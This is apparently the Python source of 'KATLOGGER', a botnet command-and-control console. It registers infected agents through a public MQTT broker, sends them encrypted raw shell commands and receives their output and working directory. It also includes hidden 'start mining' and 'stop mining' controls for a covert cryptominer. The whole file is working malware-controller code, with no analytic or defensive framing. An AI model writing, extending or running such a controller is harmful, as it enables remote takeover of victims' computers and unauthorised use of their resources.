try:
    import os, time, json, base64, uuid, threading, shlex
    from colorama import init, Fore
    import paho.mqtt.client as mqtt
    from nacl.public import PrivateKey, PublicKey, Box
    from nacl.encoding import Base64Encoder
except ImportError as e:
    print(e)
    input("Press Enter to exit...")
CONTROLLER_ID = "my_controller"
BROKER = "broker.emqx.io"
PORT = 8083  
KEYFILE = "ctrl_private.key"
peers_pub = {}
peers_cwd = {}
responses = {}
selected_agents = []

def load_or_create_keyfile(path):
    if os.path.exists(path):
        return PrivateKey(open(path,"rb").read())
    sk = PrivateKey.generate()
    open(path,"wb").write(bytes(sk))
    return sk

sk = load_or_create_keyfile(KEYFILE)
pk_b64 = sk.public_key.encode(encoder=Base64Encoder).decode()

client = mqtt.Client(client_id=f"ctrl_{int(time.time())}", transport="websockets")
client.ws_set_options(path="/mqtt") 

def publish_meta():
    client.publish(f"meta/{CONTROLLER_ID}", json.dumps({"pub": pk_b64}), retain=True)

def safe_send_encrypted(topic, target_pub_b64, payload_obj):
    box = Box(sk, PublicKey(target_pub_b64.encode(), encoder=Base64Encoder))
    ct = box.encrypt(json.dumps(payload_obj).encode())
    client.publish(topic, json.dumps({"from": CONTROLLER_ID, "data": base64.b64encode(ct).decode()}))

def on_connect(c, u, flags, rc):
    print("MQTT connected rc", rc)
    c.subscribe(f"out/{CONTROLLER_ID}")
    c.subscribe("meta/#")
    publish_meta()
def send_control_command(command):
    if not selected_agents:
        print(Fore.RED + "No agents selected!" + Fore.RESET)
        return
    req_id = str(uuid.uuid4())
    req = {
        "type": "control",
        "from": CONTROLLER_ID,
        "id": req_id,
        "command": command
    }
    for agent_id in selected_agents:
        pub = peers_pub.get(agent_id)
        if not pub:
            continue
        safe_send_encrypted(f"cmd/{agent_id}", pub, req)
    print(Fore.GREEN + f"Sent '{command}' to {selected_agents}" + Fore.RESET)
def on_message(c, u, msg):
    try:
        topic = msg.topic
        payload = msg.payload.decode()
        if topic.startswith("meta/"):
            pid = topic.split("/",1)[1]
            if pid != CONTROLLER_ID:
                obj = json.loads(payload)
                pub = obj.get("pub")
                if pub: peers_pub[pid] = pub; print(f"[Controller] Registred agent: {pid}")
            return
        if topic == f"out/{CONTROLLER_ID}":
            o = json.loads(payload)
            enc_b64 = o.get("data"); sender = o.get("from")
            if not enc_b64 or not sender: return
            sender_pub = peers_pub.get(sender)
            if not sender_pub: return
            box = Box(sk, PublicKey(sender_pub.encode(), encoder=Base64Encoder))
            pt = box.decrypt(base64.b64decode(enc_b64))
            obj = json.loads(pt.decode())
            rid = obj.get("id"); t = obj.get("type")
            if t == "cwd": peers_cwd[sender]=obj.get("cwd"); print(Fore.YELLOW + f"[{sender}] CWD updated: {obj.get('cwd')}" + Fore.RESET)
            elif t=="cmd_output": print(f"[{sender}] {obj.get('line')}")
            elif t=="cmd_exit": responses.setdefault(rid, {})["exit"]=obj
    except: pass

client.on_connect = on_connect
client.on_message = on_message
client.connect(BROKER, PORT, 60)
client.loop_start()

def send_raw(cmd_string):
    if not selected_agents: return
    req_id = str(uuid.uuid4())
    exec_list = shlex.split(cmd_string)
    req = {"type":"cmd_start","from":CONTROLLER_ID,"id":req_id,
           "cmd_display":cmd_string,"exec_type":"raw","exec":exec_list}
    for agent_id in selected_agents:
        if agent_id not in peers_pub: continue
        safe_send_encrypted(f"cmd/{agent_id}", peers_pub[agent_id], req)

def cli_loop():
    global selected_agents
    while True:
     try:
        cwd_display = ""
        if selected_agents:
            first = selected_agents[0]
            cwd_display = peers_cwd.get(first, "")
        cmd = input(f"KATLOGGER-{cwd_display}> ").strip()
        if cmd.startswith("agent "):
            args = cmd[6:].strip().split()
            if args[0].lower()=="all": selected_agents=list(peers_pub.keys())
            else: selected_agents=[a for a in args if a in peers_pub]
            print(Fore.YELLOW + f"Selected agents: {selected_agents}" + Fore.RESET)
        elif cmd.startswith("refresh"):
            print(Fore.YELLOW + "Avabile agents:", list(peers_pub.keys()) + Fore.RESET)
        elif cmd.startswith("start mining"):
            send_control_command("start mining")
        elif cmd.startswith("stop mining"):
            send_control_command("stop mining")
        elif cmd.startswith("raw "):
            send_raw(cmd[4:].strip())
        elif cmd in ("exit","quit"): break
        elif cmd.startswith("help"):
            print("""
Available commands:
    agent <id1> <id2> ...   - Select agents by ID (or 'all' for all)
    refresh                 - List available agents
    raw <command>           - Send raw command to selected agents
    help                    - Show this help message
    exit, quit              - Exit the controller


""")
        elif cmd.startswith("") or not cmd:
            continue
        else: print("Unknown command")
     except Exception as e:
        print(Fore.RED + f"Error: {e}" + Fore.RESET)
        continue
threading.Thread(target=cli_loop, daemon=True).start()

try:
    while True: time.sleep(1)
except KeyboardInterrupt: pass

client.loop_stop()
client.disconnect()
